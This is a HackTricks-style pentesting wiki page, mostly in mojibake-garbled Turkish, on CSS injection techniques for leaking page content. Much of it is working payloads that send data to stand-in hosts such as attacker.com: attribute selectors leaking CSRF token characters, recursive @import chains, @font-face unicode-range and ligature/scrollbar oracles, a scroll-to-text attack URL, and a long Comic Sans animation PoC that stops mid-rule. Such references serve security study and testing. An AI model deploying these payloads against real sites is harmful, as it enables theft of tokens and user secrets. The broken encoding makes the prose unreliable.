# CSS Injection

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** bizi **takip edin** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}


## CSS Injection

### Attribute Selector

CSS seÃ§icileri, bir `input` Ã¶ÄŸesinin `name` ve `value` Ã¶zniteliklerinin deÄŸerleriyle eÅŸleÅŸecek ÅŸekilde oluÅŸturulmuÅŸtur. EÄŸer input Ã¶ÄŸesinin value Ã¶zniteliÄŸi belirli bir karakterle baÅŸlÄ±yorsa, Ã¶nceden tanÄ±mlanmÄ±ÅŸ bir dÄ±ÅŸ kaynak yÃ¼klenir:
```css
input[name=csrf][value^=a]{
background-image: url(https://attacker.com/exfil/a);
}
input[name=csrf][value^=b]{
background-image: url(https://attacker.com/exfil/b);
}
/* ... */
input[name=csrf][value^=9]{
background-image: url(https://attacker.com/exfil/9);
}
```
Ancak, bu yaklaÅŸÄ±m gizli giriÅŸ Ã¶ÄŸeleri (`type="hidden"`) ile Ã§alÄ±ÅŸÄ±rken bir sÄ±nÄ±ra sahiptir Ã§Ã¼nkÃ¼ gizli Ã¶ÄŸeler arka planlarÄ± yÃ¼klemez.

#### Gizli Ã–ÄŸeler iÃ§in AÅŸma

Bu sÄ±nÄ±rlamayÄ± aÅŸmak iÃ§in, `~` genel kardeÅŸ kombinatÃ¶rÃ¼nÃ¼ kullanarak bir sonraki kardeÅŸ Ã¶ÄŸeyi hedefleyebilirsiniz. CSS kuralÄ±, gizli giriÅŸ Ã¶ÄŸesini takip eden tÃ¼m kardeÅŸlere uygulanÄ±r ve arka plan resmi yÃ¼klenir:
```css
input[name=csrf][value^=csrF] ~ * {
background-image: url(https://attacker.com/exfil/csrF);
}
```
A practical example of exploiting this technique is detailed in the provided code snippet. You can view it [here](https://gist.github.com/d0nutptr/928301bde1d2aa761d1632628ee8f24e).

#### CSS Enjeksiyonu iÃ§in Ã–n KoÅŸullar

CSS Enjeksiyonu tekniÄŸinin etkili olabilmesi iÃ§in belirli koÅŸullarÄ±n saÄŸlanmasÄ± gerekmektedir:

1. **YÃ¼k UzunluÄŸu**: CSS enjeksiyon vektÃ¶rÃ¼, oluÅŸturulmuÅŸ seÃ§icileri barÄ±ndÄ±racak kadar uzun yÃ¼kleri desteklemelidir.
2. **CSS Yeniden DeÄŸerlendirmesi**: SayfayÄ± Ã§erÃ§eveleme yeteneÄŸine sahip olmalÄ±sÄ±nÄ±z; bu, yeni oluÅŸturulmuÅŸ yÃ¼klerle CSS'nin yeniden deÄŸerlendirilmesini tetiklemek iÃ§in gereklidir.
3. **DÄ±ÅŸ Kaynaklar**: Teknik, dÄ±ÅŸarÄ±da barÄ±ndÄ±rÄ±lan resimleri kullanma yeteneÄŸini varsayar. Bu, sitenin Ä°Ã§erik GÃ¼venlik PolitikasÄ± (CSP) tarafÄ±ndan kÄ±sÄ±tlanabilir.

### KÃ¶r Ã–zellik SeÃ§ici

As [**explained in this post**](https://portswigger.net/research/blind-css-exfiltration), it's possible to combine the selectors **`:has`** and **`:not`** to identify content even from blind elements. This is very useful when you have no idea what is inside the web page loading the CSS injection.\
It's also possible to use those selectors to extract information from several block of the same type like in:
```html
<style>
html:has(input[name^="m"]):not(input[name="mytoken"]) {
background:url(/m);
}
</style>
<input name=mytoken value=1337>
<input name=myname value=gareth>
```
Bunu aÅŸaÄŸÄ±daki **@import** tekniÄŸi ile birleÅŸtirerek, **gÃ¶zlemci sayfalardan CSS enjeksiyonu kullanarak Ã§ok fazla bilgi sÄ±zdÄ±rmak** mÃ¼mkÃ¼n [**blind-css-exfiltration**](https://github.com/hackvertor/blind-css-exfiltration)**.**

### @import

Ã–nceki tekniÄŸin bazÄ± dezavantajlarÄ± vardÄ±r, Ã¶n koÅŸullarÄ± kontrol edin. Ya **kurbanÄ±n birden fazla baÄŸlantÄ± alabilmesi** gerekir, ya da **CSS enjeksiyonu zafiyeti olan sayfayÄ± iframe'leyebilmeniz** gerekir.

Ancak, tekniÄŸin kalitesini artÄ±rmak iÃ§in **CSS `@import`** kullanan baÅŸka bir akÄ±llÄ± teknik vardÄ±r.

Bu ilk olarak [**Pepe Vila**](https://vwzq.net/slides/2019-s3\_css\_injection\_attacks.pdf) tarafÄ±ndan gÃ¶sterildi ve ÅŸÃ¶yle Ã§alÄ±ÅŸÄ±r:

Her seferinde on farklÄ± yÃ¼k ile aynÄ± sayfayÄ± tekrar tekrar yÃ¼klemek yerine (Ã¶ncekinde olduÄŸu gibi), **sayfayÄ± sadece bir kez ve sadece saldÄ±rganÄ±n sunucusuna bir import ile yÃ¼kleyeceÄŸiz** (bu, kurbana gÃ¶nderilecek yÃ¼k):
```css
@import url('//attacker.com:5001/start?');
```
1. Ä°thalat, **saldÄ±rganlardan bazÄ± CSS scriptleri alacak** ve **tarayÄ±cÄ± bunu yÃ¼kleyecek**.
2. SaldÄ±rganÄ±n gÃ¶ndereceÄŸi CSS scriptinin ilk kÄ±smÄ±, **saldÄ±rganÄ±n sunucusuna tekrar baÅŸka bir `@import` olacak.**
1. SaldÄ±rganÄ±n sunucusu bu isteÄŸe henÃ¼z yanÄ±t vermeyecek, Ã§Ã¼nkÃ¼ bazÄ± karakterleri sÄ±zdÄ±rmak istiyoruz ve ardÄ±ndan bu ithalatÄ±, sonraki karakterleri sÄ±zdÄ±rmak iÃ§in yÃ¼k ile yanÄ±tlayacaÄŸÄ±z.
3. YÃ¼kÃ¼n ikinci ve daha bÃ¼yÃ¼k kÄ±smÄ±, **bir nitelik seÃ§ici sÄ±zÄ±ntÄ± yÃ¼kÃ¼** olacak.
1. Bu, saldÄ±rganÄ±n sunucusuna **sÄ±rrÄ±n ilk karakterini ve son karakterini** gÃ¶nderecek.
4. SaldÄ±rganÄ±n sunucusu **sÄ±rrÄ±n ilk ve son karakterini** aldÄ±ktan sonra, **adÄ±m 2'de talep edilen ithalata yanÄ±t verecek**.
1. YanÄ±t, **adÄ±m 2, 3 ve 4'tekiyle** tam olarak aynÄ± olacak, ancak bu sefer **sÄ±rrÄ±n ikinci karakterini ve ardÄ±ndan sondan bir Ã¶nceki karakteri bulmaya Ã§alÄ±ÅŸacak**.

SaldÄ±rgan, **sÄ±rrÄ± tamamen sÄ±zdÄ±rana kadar bu dÃ¶ngÃ¼yÃ¼ takip edecek**.

Orijinal [**Pepe Vila'nÄ±n bunu istismar etmek iÃ§in kodunu burada bulabilirsiniz**](https://gist.github.com/cgvwzq/6260f0f0a47c009c87b4d46ce3808231) veya neredeyse [**aynÄ± kodu ama yorumlu burada bulabilirsiniz**.](./#css-injection)

{% hint style="info" %}
Script, her seferinde 2 karakter keÅŸfetmeye Ã§alÄ±ÅŸacak (baÅŸlangÄ±Ã§tan ve sondan) Ã§Ã¼nkÃ¼ nitelik seÃ§ici, ÅŸunlarÄ± yapmaya izin veriyor:
```css
/* value^=  to match the beggining of the value*/
input[value^="0"]{--s0:url(http://localhost:5001/leak?pre=0)}

/* value$=  to match the ending of the value*/
input[value$="f"]{--e0:url(http://localhost:5001/leak?post=f)}
```
Bu, scriptin sÄ±rrÄ± daha hÄ±zlÄ± sÄ±zdÄ±rmasÄ±na olanak tanÄ±r.  
{% endhint %}

{% hint style="warning" %}
Bazen script **Ã¶nek + sonek'in zaten tam bayrak olduÄŸunu doÄŸru bir ÅŸekilde tespit etmez** ve ileri (Ã¶nek iÃ§inde) ve geri (sonek iÃ§inde) devam eder ve bir noktada takÄ±lÄ±r.\
EndiÅŸelenmeyin, sadece **Ã§Ä±ktÄ±yÄ±** kontrol edin Ã§Ã¼nkÃ¼ **orada bayraÄŸÄ± gÃ¶rebilirsiniz**.  
{% endhint %}

### DiÄŸer seÃ§iciler

**CSS seÃ§icileri** ile DOM parÃ§alarÄ±na eriÅŸmenin diÄŸer yollarÄ±:

* **`.class-to-search:nth-child(2)`**: Bu, DOM'daki "class-to-search" sÄ±nÄ±fÄ±na sahip ikinci Ã¶ÄŸeyi arar.
*   **`:empty`** seÃ§ici: Ã–rneÄŸin [**bu yazÄ±da**](https://github.com/b14d35/CTF-Writeups/tree/master/bi0sCTF%202022/Emo-Locker)** kullanÄ±lÄ±r:**

```css
[role^="img"][aria-label="1"]:empty { background-image: url("YOUR_SERVER_URL?1"); }
```

### Hata tabanlÄ± XS-Search

**Referans:** [CSS tabanlÄ± SaldÄ±rÄ±: @font-face'in unicode-range'ini kÃ¶tÃ¼ye kullanma](https://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html), [Hata TabanlÄ± XS-Search PoC @terjanq tarafÄ±ndan](https://twitter.com/terjanq/status/1180477124861407234)

Genel amaÃ§, **kontrol edilen bir uÃ§ noktadan Ã¶zel bir font kullanmak** ve **metnin (bu durumda, 'A') yalnÄ±zca belirtilen kaynak (`favicon.ico`) yÃ¼klenemediÄŸinde bu fontla gÃ¶rÃ¼ntÃ¼lenmesini saÄŸlamak**tÄ±r.
```html
<!DOCTYPE html>
<html>
<head>
<style>
@font-face{
font-family: poc;
src: url(http://attacker.com/?leak);
unicode-range:U+0041;
}

#poc0{
font-family: 'poc';
}

</style>
</head>
<body>

<object id="poc0" data="http://192.168.0.1/favicon.ico">A</object>
</body>
</html>
```
1. **Ã–zel YazÄ± Tipi KullanÄ±mÄ±**:
- Ã–zel bir yazÄ± tipi, `<head>` bÃ¶lÃ¼mÃ¼ndeki bir `<style>` etiketi iÃ§inde `@font-face` kuralÄ± kullanÄ±larak tanÄ±mlanÄ±r.
- YazÄ± tipinin adÄ± `poc` ve harici bir uÃ§ noktadan (`http://attacker.com/?leak`) alÄ±nÄ±r.
- `unicode-range` Ã¶zelliÄŸi, belirli Unicode karakteri 'A' hedef alÄ±narak `U+0041` olarak ayarlanmÄ±ÅŸtÄ±r.

2. **Yedek Metin ile Nesne ElemanÄ±**:
- `<body>` bÃ¶lÃ¼mÃ¼nde `id="poc0"` olan bir `<object>` elemanÄ± oluÅŸturulur. Bu eleman, `http://192.168.0.1/favicon.ico` adresinden bir kaynak yÃ¼klemeye Ã§alÄ±ÅŸÄ±r.
- Bu eleman iÃ§in `font-family`, `<style>` bÃ¶lÃ¼mÃ¼nde tanÄ±mlandÄ±ÄŸÄ± gibi `'poc'` olarak ayarlanmÄ±ÅŸtÄ±r.
- EÄŸer kaynak (`favicon.ico`) yÃ¼klenemezse, `<object>` etiketinin iÃ§indeki yedek iÃ§erik (harf 'A') gÃ¶rÃ¼ntÃ¼lenir.
- Harf 'A', harici kaynak yÃ¼klenemezse Ã¶zel yazÄ± tipi `poc` kullanÄ±larak render edilecektir.

### KaydÄ±rma ile Metin ParÃ§asÄ±nÄ± Stil Verme

**`:target`** psÃ¶do-sÄ±nÄ±fÄ±, [CSS SeÃ§icileri Seviye 4 spesifikasyonu](https://drafts.csswg.org/selectors-4/#the-target-pseudo) gereÄŸince bir **URL parÃ§asÄ±** tarafÄ±ndan hedeflenen bir elementi seÃ§mek iÃ§in kullanÄ±lÄ±r. `::target-text`'in, metin aÃ§Ä±kÃ§a parÃ§a tarafÄ±ndan hedeflenmedikÃ§e hiÃ§bir elementi eÅŸleÅŸmeyeceÄŸini anlamak Ã¶nemlidir.

SaldÄ±rganlarÄ±n **KaydÄ±rma ile Metin** parÃ§asÄ± Ã¶zelliÄŸini kullanarak belirli bir metnin bir web sayfasÄ±nda varlÄ±ÄŸÄ±nÄ± doÄŸrulamak iÃ§in HTML enjeksiyonu yoluyla kendi sunucularÄ±ndan bir kaynak yÃ¼klemelerine olanak tanÄ±yan bir gÃ¼venlik endiÅŸesi ortaya Ã§Ä±kmaktadÄ±r. YÃ¶ntem, ÅŸu ÅŸekilde bir CSS kuralÄ± enjekte etmeyi iÃ§erir:
```css
:target::before { content : url(target.png) }
```
Bu tÃ¼r senaryolarda, sayfada "Administrator" metni varsa, `target.png` kaynaÄŸÄ± sunucudan talep edilir ve metnin varlÄ±ÄŸÄ±nÄ± gÃ¶sterir. Bu saldÄ±rÄ±nÄ±n bir Ã¶rneÄŸi, enjekte edilen CSS'yi bir Scroll-to-text parÃ§asÄ±yla birlikte iÃ§eren Ã¶zel olarak hazÄ±rlanmÄ±ÅŸ bir URL aracÄ±lÄ±ÄŸÄ±yla gerÃ§ekleÅŸtirilebilir:
```
http://127.0.0.1:8081/poc1.php?note=%3Cstyle%3E:target::before%20{%20content%20:%20url(http://attackers-domain/?confirmed_existence_of_Administrator_username)%20}%3C/style%3E#:~:text=Administrator
```
Burada, saldÄ±rÄ± CSS kodunu iletmek iÃ§in HTML enjeksiyonunu manipÃ¼le ediyor ve "Administrator" metnini Scroll-to-text fragment (`#:~:text=Administrator`) aracÄ±lÄ±ÄŸÄ±yla hedef alÄ±yor. Metin bulunursa, belirtilen kaynak yÃ¼klenir ve bu durum istemeden saldÄ±rgana varlÄ±ÄŸÄ±nÄ± sinyal eder.

Hafifletme iÃ§in aÅŸaÄŸÄ±daki noktalar dikkate alÄ±nmalÄ±dÄ±r:

1. **SÄ±nÄ±rlÄ± STTF EÅŸleÅŸmesi**: Scroll-to-text Fragment (STTF), yalnÄ±zca kelimeleri veya cÃ¼mleleri eÅŸleÅŸtirmek Ã¼zere tasarlanmÄ±ÅŸtÄ±r, bu nedenle rastgele sÄ±rlarÄ±n veya token'larÄ±n sÄ±zdÄ±rÄ±lma yeteneÄŸini sÄ±nÄ±rlamaktadÄ±r.
2. **Ãœst DÃ¼zey TarayÄ±cÄ± BaÄŸlamlarÄ±na KÄ±sÄ±tlama**: STTF yalnÄ±zca Ã¼st dÃ¼zey tarayÄ±cÄ± baÄŸlamlarÄ±nda Ã§alÄ±ÅŸÄ±r ve iframe'ler iÃ§inde iÅŸlev gÃ¶rmez, bu da herhangi bir istismar giriÅŸimini kullanÄ±cÄ±ya daha belirgin hale getirir.
3. **KullanÄ±cÄ± EtkileÅŸimi GerekliliÄŸi**: STTF'nin Ã§alÄ±ÅŸmasÄ± iÃ§in bir kullanÄ±cÄ± etkileÅŸimi gereklidir, bu da istismarlarÄ±n yalnÄ±zca kullanÄ±cÄ± tarafÄ±ndan baÅŸlatÄ±lan gezintilerle mÃ¼mkÃ¼n olduÄŸu anlamÄ±na gelir. Bu gereklilik, saldÄ±rÄ±larÄ±n kullanÄ±cÄ± etkileÅŸimi olmadan otomatikleÅŸtirilme riskini Ã¶nemli Ã¶lÃ§Ã¼de azaltÄ±r. Bununla birlikte, blog yazÄ±sÄ±nÄ±n yazarÄ±, saldÄ±rÄ±nÄ±n otomatikleÅŸtirilmesini kolaylaÅŸtÄ±rabilecek belirli koÅŸullarÄ± ve geÃ§iÅŸ yollarÄ±nÄ± (Ã¶rneÄŸin, sosyal mÃ¼hendislik, yaygÄ±n tarayÄ±cÄ± uzantÄ±larÄ±yla etkileÅŸim) belirtmektedir.

Bu mekanizmalarÄ±n ve potansiyel zayÄ±flÄ±klarÄ±n farkÄ±nda olmak, web gÃ¼venliÄŸini saÄŸlamak ve bu tÃ¼r istismar taktiklerine karÅŸÄ± korunmak iÃ§in anahtardÄ±r.

Daha fazla bilgi iÃ§in orijinal raporu kontrol edin: [https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/](https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/)

Bu teknikle bir CTF iÃ§in bir [**istismar kontrol edebilirsiniz**](https://gist.github.com/haqpl/52455c8ddfec33aeefb468301d70b6eb).

### @font-face / unicode-range <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>

**Sayfada mevcut olan unicode deÄŸerleri** iÃ§in yalnÄ±zca **toplanacak olan belirli unicode deÄŸerleri iÃ§in dÄ±ÅŸ fontlar belirtebilirsiniz**. Ã–rneÄŸin:
```html
<style>
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?A); /* fetched */
unicode-range:U+0041;
}
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?B); /* fetched too */
unicode-range:U+0042;
}
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?C); /* not fetched */
unicode-range:U+0043;
}
#sensitive-information{
font-family:poc;
}
</style>

<p id="sensitive-information">AB</p>htm
```
When you access this page, Chrome and Firefox fetch "?A" and "?B" because text node of sensitive-information contains "A" and "B" characters. But Chrome and Firefox do not fetch "?C" because it does not contain "C". This means that we have been able to read "A" and "B".

### Text node exfiltration (I): ligatures <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>

**Reference:** [Wykradanie danych w Å›wietnym stylu â€“ czyli jak wykorzystaÄ‡ CSS-y do atakÃ³w na webaplikacjÄ™](https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/)

AÃ§Ä±klanan teknik, font ligatÃ¼rlerini kullanarak bir dÃ¼ÄŸÃ¼mden metin Ã§Ä±karmayÄ± ve geniÅŸlikteki deÄŸiÅŸiklikleri izlemeyi iÃ§erir. SÃ¼reÃ§ birkaÃ§ adÄ±mdan oluÅŸur:

1. **Ã–zel FontlarÄ±n OluÅŸturulmasÄ±**:
- Ä°ki karakter dizisini temsil eden bir glif iÃ§in bÃ¼yÃ¼k bir geniÅŸlik ayarlayan `horiz-adv-x` niteliÄŸine sahip glifler ile SVG fontlarÄ± oluÅŸturulur.
- Ã–rnek SVG glifi: `<glyph unicode="XY" horiz-adv-x="8000" d="M1 0z"/>`, burada "XY" iki karakter dizisini belirtir.
- Bu fontlar daha sonra fontforge kullanÄ±larak woff formatÄ±na dÃ¶nÃ¼ÅŸtÃ¼rÃ¼lÃ¼r.

2. **GeniÅŸlik DeÄŸiÅŸikliklerinin Tespiti**:
- Metnin sarÄ±lmamasÄ±nÄ± saÄŸlamak iÃ§in CSS kullanÄ±lÄ±r (`white-space: nowrap`) ve kaydÄ±rÄ±cÄ± stilini Ã¶zelleÅŸtirmek iÃ§in.
- FarklÄ± bir ÅŸekilde stillendirilmiÅŸ yatay bir kaydÄ±rÄ±cÄ±nÄ±n gÃ¶rÃ¼nÃ¼mÃ¼, metinde belirli bir ligatÃ¼rÃ¼n ve dolayÄ±sÄ±yla belirli bir karakter dizisinin mevcut olduÄŸunun bir gÃ¶stergesi (oracle) olarak iÅŸlev gÃ¶rÃ¼r.
- Ä°lgili CSS:
```css
body { white-space: nowrap };
body::-webkit-scrollbar { background: blue; }
body::-webkit-scrollbar:horizontal { background: url(http://attacker.com/?leak); }
```

3. **SÃ¶mÃ¼rÃ¼ SÃ¼reci**:
- **AdÄ±m 1**: GeniÅŸliÄŸi bÃ¼yÃ¼k olan karakter Ã§iftleri iÃ§in fontlar oluÅŸturulur.
- **AdÄ±m 2**: BÃ¼yÃ¼k geniÅŸlik glifinin (bir karakter Ã§iftinin ligatÃ¼rÃ¼) render edildiÄŸini tespit etmek iÃ§in kaydÄ±rÄ±cÄ± tabanlÄ± bir hile kullanÄ±lÄ±r, bu da karakter dizisinin mevcut olduÄŸunu gÃ¶sterir.
- **AdÄ±m 3**: Bir ligatÃ¼r tespit edildiÄŸinde, tespit edilen Ã§ifti iÃ§eren ve bir Ã¶nceki veya sonraki karakter ekleyen Ã¼Ã§ karakter dizilerini temsil eden yeni glifler Ã¼retilir.
- **AdÄ±m 4**: ÃœÃ§ karakter ligatÃ¼rÃ¼nÃ¼n tespiti gerÃ§ekleÅŸtirilir.
- **AdÄ±m 5**: SÃ¼reÃ§ tekrarlanÄ±r, metnin tamamÄ± yavaÅŸ yavaÅŸ aÃ§Ä±ÄŸa Ã§Ä±kar.

4. **Optimizasyon**:
- `<meta refresh=...` kullanarak mevcut baÅŸlatma yÃ¶ntemi optimal deÄŸildir.
- Daha verimli bir yaklaÅŸÄ±m, sÃ¶mÃ¼rÃ¼nÃ¼n performansÄ±nÄ± artÄ±ran CSS `@import` hilesini iÃ§erebilir.

### Text node exfiltration (II): leaking the charset with a default font (not requiring external assets) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Reference:** [PoC using Comic Sans by @Cgvwzq & @Terjanq](https://demo.vwzq.net/css2.html)

Bu hile, bu [**Slackers thread**](https://www.reddit.com/r/Slackers/comments/dzrx2s/what\_can\_we\_do\_with\_single\_css\_injection/) iÃ§inde yayÄ±mlandÄ±. Bir metin dÃ¼ÄŸÃ¼mÃ¼nde kullanÄ±lan karakter seti, tarayÄ±cÄ±da yÃ¼klÃ¼ olan **varsayÄ±lan fontlar** kullanÄ±larak sÄ±zdÄ±rÄ±labilir: dÄ±ÅŸarÄ±dan -veya Ã¶zel- fontlara ihtiyaÃ§ yoktur.

Kavram, bir `div`'in geniÅŸliÄŸini kademeli olarak artÄ±rmak iÃ§in bir animasyon kullanmayÄ± ve bir karakterin bir seferde 'suffix' kÄ±smÄ±ndan 'prefix' kÄ±smÄ±na geÃ§iÅŸ yapmasÄ±nÄ± saÄŸlamayÄ± iÃ§erir. Bu sÃ¼reÃ§, metni iki bÃ¶lÃ¼me ayÄ±rÄ±r:

1. **Prefix**: Ä°lk satÄ±r.
2. **Suffix**: Sonraki satÄ±r(lar).

Karakterlerin geÃ§iÅŸ aÅŸamalarÄ± ÅŸu ÅŸekilde gÃ¶rÃ¼necektir:

**C**\
ADB

**CA**\
DB

**CAD**\
B

**CADB**


Bu geÃ§iÅŸ sÄ±rasÄ±nda, **unicode-range trick** kullanÄ±larak her yeni karakterin prefix'e katÄ±lmasÄ± tespit edilir. Bu, fontun Comic Sans'a deÄŸiÅŸtirilmesiyle gerÃ§ekleÅŸtirilir; bu font, varsayÄ±lan fonttan belirgin ÅŸekilde daha yÃ¼ksektir ve dolayÄ±sÄ±yla dikey bir kaydÄ±rÄ±cÄ±yÄ± tetikler. Bu kaydÄ±rÄ±cÄ±nÄ±n gÃ¶rÃ¼nÃ¼mÃ¼, prefix'te yeni bir karakterin varlÄ±ÄŸÄ±nÄ± dolaylÄ± olarak ortaya Ã§Ä±karÄ±r.

Bu yÃ¶ntem, benzersiz karakterlerin gÃ¶rÃ¼nmesiyle tespit edilmesini saÄŸlasa da, hangi karakterin tekrarlandÄ±ÄŸÄ±nÄ± belirtmez, yalnÄ±zca bir tekrarÄ±n gerÃ§ekleÅŸtiÄŸini gÃ¶sterir.

{% hint style="info" %}
Temelde, **unicode-range bir karakteri tespit etmek iÃ§in kullanÄ±lÄ±r**, ancak dÄ±ÅŸ bir font yÃ¼klemek istemediÄŸimiz iÃ§in baÅŸka bir yol bulmamÄ±z gerekir.\
**Karakter** **bulunduÄŸunda**, Ã¶nceden yÃ¼klenmiÅŸ **Comic Sans fontu** ile **verilir**, bu da karakteri **bÃ¼yÃ¼tÃ¼r** ve **kaydÄ±rÄ±cÄ±yÄ± tetikler**; bu da **bulunan karakteri sÄ±zdÄ±rÄ±r**.
{% endhint %}

Check the code extracted from the PoC:
```css
/* comic sans is high (lol) and causes a vertical overflow */
@font-face{font-family:has_A;src:local('Comic Sans MS');unicode-range:U+41;font-style:monospace;}
@font-face{font-family:has_B;src:local('Comic Sans MS');unicode-range:U+42;font-style:monospace;}
@font-face{font-family:has_C;src:local('Comic Sans MS');unicode-range:U+43;font-style:monospace;}
@font-face{font-family:has_D;src:local('Comic Sans MS');unicode-range:U+44;font-style:monospace;}
@font-face{font-family:has_E;src:local('Comic Sans MS');unicode-range:U+45;font-style:monospace;}
@font-face{font-family:has_F;src:local('Comic Sans MS');unicode-range:U+46;font-style:monospace;}
@font-face{font-family:has_G;src:local('Comic Sans MS');unicode-range:U+47;font-style:monospace;}
@font-face{font-family:has_H;src:local('Comic Sans MS');unicode-range:U+48;font-style:monospace;}
@font-face{font-family:has_I;src:local('Comic Sans MS');unicode-range:U+49;font-style:monospace;}
@font-face{font-family:has_J;src:local('Comic Sans MS');unicode-range:U+4a;font-style:monospace;}
@font-face{font-family:has_K;src:local('Comic Sans MS');unicode-range:U+4b;font-style:monospace;}
@font-face{font-family:has_L;src:local('Comic Sans MS');unicode-range:U+4c;font-style:monospace;}
@font-face{font-family:has_M;src:local('Comic Sans MS');unicode-range:U+4d;font-style:monospace;}
@font-face{font-family:has_N;src:local('Comic Sans MS');unicode-range:U+4e;font-style:monospace;}
@font-face{font-family:has_O;src:local('Comic Sans MS');unicode-range:U+4f;font-style:monospace;}
@font-face{font-family:has_P;src:local('Comic Sans MS');unicode-range:U+50;font-style:monospace;}
@font-face{font-family:has_Q;src:local('Comic Sans MS');unicode-range:U+51;font-style:monospace;}
@font-face{font-family:has_R;src:local('Comic Sans MS');unicode-range:U+52;font-style:monospace;}
@font-face{font-family:has_S;src:local('Comic Sans MS');unicode-range:U+53;font-style:monospace;}
@font-face{font-family:has_T;src:local('Comic Sans MS');unicode-range:U+54;font-style:monospace;}
@font-face{font-family:has_U;src:local('Comic Sans MS');unicode-range:U+55;font-style:monospace;}
@font-face{font-family:has_V;src:local('Comic Sans MS');unicode-range:U+56;font-style:monospace;}
@font-face{font-family:has_W;src:local('Comic Sans MS');unicode-range:U+57;font-style:monospace;}
@font-face{font-family:has_X;src:local('Comic Sans MS');unicode-range:U+58;font-style:monospace;}
@font-face{font-family:has_Y;src:local('Comic Sans MS');unicode-range:U+59;font-style:monospace;}
@font-face{font-family:has_Z;src:local('Comic Sans MS');unicode-range:U+5a;font-style:monospace;}
@font-face{font-family:has_0;src:local('Comic Sans MS');unicode-range:U+30;font-style:monospace;}
@font-face{font-family:has_1;src:local('Comic Sans MS');unicode-range:U+31;font-style:monospace;}
@font-face{font-family:has_2;src:local('Comic Sans MS');unicode-range:U+32;font-style:monospace;}
@font-face{font-family:has_3;src:local('Comic Sans MS');unicode-range:U+33;font-style:monospace;}
@font-face{font-family:has_4;src:local('Comic Sans MS');unicode-range:U+34;font-style:monospace;}
@font-face{font-family:has_5;src:local('Comic Sans MS');unicode-range:U+35;font-style:monospace;}
@font-face{font-family:has_6;src:local('Comic Sans MS');unicode-range:U+36;font-style:monospace;}
@font-face{font-family:has_7;src:local('Comic Sans MS');unicode-range:U+37;font-style:monospace;}
@font-face{font-family:has_8;src:local('Comic Sans MS');unicode-range:U+38;font-style:monospace;}
@font-face{font-family:has_9;src:local('Comic Sans MS');unicode-range:U+39;font-style:monospace;}
@font-face{font-family:rest;src: local('Courier New');font-style:monospace;unicode-range:U+0-10FFFF}

div.leak {
overflow-y: auto; /* leak channel */
overflow-x: hidden; /* remove false positives */
height: 40px; /* comic sans capitals exceed this height */
font-size: 0px; /* make suffix invisible */
letter-spacing: 0px; /* separation */
word-break: break-all; /* small width split words in lines */
font-family: rest; /* default */
background: grey; /* default */
width: 0px; /* initial value */
animation: loop step-end 200s 0s, trychar step-end 2s 0s; /* animations: trychar duration must be 1/100th of loop duration */
animation-iteration-count: 1, infinite; /* single width iteration, repeat trychar one per width increase (or infinite) */
}

div.leak::first-line{
font-size: 30px; /* prefix is visible in first line */
text-transform: uppercase; /* only capital letters leak */
}

/* iterate over all chars */
@keyframes trychar {
0% { font-family: rest; } /* delay for width change */
5% { font-family: has_A, rest; --leak: url(?a); }
6% { font-family: rest; }
10% { font-family: has_B, rest; --leak: url(?b); }
11% { font-family: rest; }
15% { font-family: has_C, rest; --leak: url(?c); }
16% { font-family: rest }
20% { font-family: has_D, rest; --leak: url(?d); }
21% { font-family: rest; }
25% { font-family: has_E, rest; --leak: url(?e); }
26% { font-family: rest; }
30% { font-family: has_F, rest; --leak: url(?f); }
31% { font-family: rest; }
35% { font-family: has_G, rest; --leak: url(?g); }
36% { font-family: rest; }
40% { font-family: has_H, rest; --leak: url(?h); }
41% { font-family: rest }
45% { font-family: has_I, rest; --leak: url(?i); }
46% { font-family: rest; }
50% { font-family: has_J, rest; --leak: url(?j); }
51% { font-family: rest; }
55% { font-family: has_K, rest; --leak: url(?k); }
56% { font-family: rest; }
60% { font-family: has_L, rest; --leak: url(?l); }
61% { font-family: rest; }
65% { font-family: has_M, rest; --leak: url(?m); }
66% { font-family: rest; }
70% { font-family: has_N, rest; --leak: url(?n); }
71% { font-family: rest; }
75% { font-family: has_O, rest; --leak: url(?o); }
76% { font-family: rest; }
80% { font-family: has_P, rest; --leak: url(?p); }
81% { font-family: rest; }
85% { font-family: has_Q, rest; --leak: url(?q); }
86% { font-family: rest; }
90% { font-family: has_R, rest; --leak: url(?r); }
91% { font-family: rest; }
95% { font-family: has_S, rest; --leak: url(?s); }
96% { font-family: rest; }
}

/* increase width char by char, i.e. add new char to prefix */
@keyframes loop {
0% { width: 0px }
1% { width: 20px }
2% { width: 40px }
3% { width: 60px }
4% { width: 80px }
4% { width: 100px }
5% { width: 120px }
6% { width: 140px }
7% { width: 0px }
}

div::-webkit-scrollbar {
background: blue;
